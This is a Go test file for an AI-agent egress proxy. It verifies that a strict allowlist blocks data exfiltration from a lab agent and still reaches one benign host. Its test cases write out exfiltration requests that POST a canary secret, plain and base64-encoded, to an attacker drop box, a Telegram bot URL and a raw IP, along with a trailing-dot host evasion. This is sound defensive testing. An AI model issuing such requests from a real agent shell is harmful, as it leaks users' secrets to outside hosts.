// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package playground

import (
	"context"
	"encoding/base64"
	"testing"
)

// TestLiveRun_ModelAllowlist_ExactAssign_DeniesDefaultsDropboxEncoded proves the
// Phase-1 egress policy for the live MODEL demo: the strict allowlist is ASSIGNED
// to exactly {benign read host, model API}, NOT appended to config.Defaults(). So:
//
//   - the default third-party hosts (github/openai/telegram/...) are NOT reachable
//     (appending the defaults would have silently approved real exfil channels);
//   - the attacker drop box (collector) is NOT approved, so an exfil attempt to it
//     is blocked at the allowlist (destination), BEFORE DNS or any content scan;
//   - encoding the secret (base64) does NOT help, because the block is on the
//     destination, not the content; and the collector independently witnesses zero;
//   - the benign read host is still reachable (not over-blocking).
//
// Every request here goes straight through the proxy via doProxiedRequest -- the
// same raw path a `curl` from the agent's run_command shell would take, bypassing
// the tool runtime. So this is also the shell-bypass proof: the guarantee is
// Pipelock-enforced, not tool-runtime-enforced.
func TestLiveRun_ModelAllowlist_ExactAssign_DeniesDefaultsDropboxEncoded(t *testing.T) {
	if testing.Short() {
		t.Skip("boots a real lab proxy + lab targets")
	}

	const runNonce = "model-allowlist-run"
	lr, err := StartLiveRun(context.Background(), LiveRunOpts{
		ScenarioID: LiveDemoScenarioID,
		RunNonce:   runNonce,
		// Setting ModelBaseURL flips the run to strict mode with the exact-assigned
		// allowlist. The override resolves the model host to loopback so no real DNS
		// is needed; the test never connects to the model.
		ModelBaseURL:      "http://model.lab.test/v1",
		ModelHostOverride: []string{"127.0.0.1"},
	})
	if err != nil {
		t.Fatalf("StartLiveRun: %v", err)
	}
	defer lr.Close()

	client := proxiedClient(t, lr)
	ctx := context.Background()

	collectorURL := lr.liveExfilURL()
	safeURL := lr.liveSafeURL()
	encodedCanary := base64.StdEncoding.EncodeToString([]byte(lr.canaryValue))

	tests := []struct {
		name    string
		method  string
		rawURL  string
		body    []byte
		wantMin int
		wantMax int
	}{
		{
			// A default-allowlisted public host must NOT be reachable: appending to
			// config.Defaults() (the bug) would have approved github.com.
			name:    "default_public_host_github_blocked",
			method:  "GET",
			rawURL:  "http://github.com/luckyPipewrench",
			wantMin: 400, wantMax: 599,
		},
		{
			name:    "default_public_host_openai_blocked",
			method:  "GET",
			rawURL:  "http://api.openai.com/v1/models",
			wantMin: 400, wantMax: 599,
		},
		{
			// The exact channel a visitor would use: their own Telegram bot.
			name:    "default_public_host_telegram_blocked",
			method:  "POST",
			rawURL:  "http://api.telegram.org/bot123:abc/sendMessage",
			body:    []byte("text=" + encodedCanary),
			wantMin: 400, wantMax: 599,
		},
		{
			// Drop box, plaintext secret -> blocked at the DESTINATION (allowlist),
			// not by body DLP (the drop box is no longer approved).
			name:    "dropbox_plaintext_blocked_at_destination",
			method:  "POST",
			rawURL:  collectorURL,
			body:    []byte("canary=" + lr.canaryValue),
			wantMin: 400, wantMax: 599,
		},
		{
			// Drop box, ENCODED secret -> still blocked. Encoding cannot beat a
			// destination block. This is the beat that used to ALLOW.
			name:    "dropbox_encoded_blocked_at_destination",
			method:  "POST",
			rawURL:  collectorURL,
			body:    []byte("blob=" + encodedCanary),
			wantMin: 400, wantMax: 599,
		},
		{
			// Direct public IP literal -> not allowlisted -> blocked.
			name:    "direct_ip_blocked",
			method:  "GET",
			rawURL:  "http://198.51.100.7/collect",
			wantMin: 400, wantMax: 599,
		},
		{
			// Trailing-dot host normalization must not sneak github.com. past the
			// allowlist (it is not approved at all now, so it must block).
			name:    "trailing_dot_host_blocked",
			method:  "GET",
			rawURL:  "http://github.com./luckyPipewrench",
			wantMin: 400, wantMax: 599,
		},
		{
			// Not over-blocking: the benign approved read host still works.
			name:    "benign_safe_host_allowed",
			method:  "GET",
			rawURL:  safeURL,
			wantMin: 200, wantMax: 299,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			st := doProxiedRequest(ctx, client, tc.method, tc.rawURL, tc.body, map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
			})
			if st < tc.wantMin || st > tc.wantMax {
				t.Fatalf("%s %s status = %d, want in [%d,%d]", tc.method, tc.rawURL, st, tc.wantMin, tc.wantMax)
			}
		})
	}

	// Independent witness: nothing (plaintext or encoded) ever reached the drop box.
	if got := lr.collector.ObservedCount(runNonce); got != 0 {
		t.Fatalf("collector observed = %d, want 0 (no exfil may reach the drop box)", got)
	}
	if got := lr.collector.TotalCount(runNonce); got != 0 {
		t.Fatalf("collector total = %d, want 0 (drop box is not an approved destination)", got)
	}
}
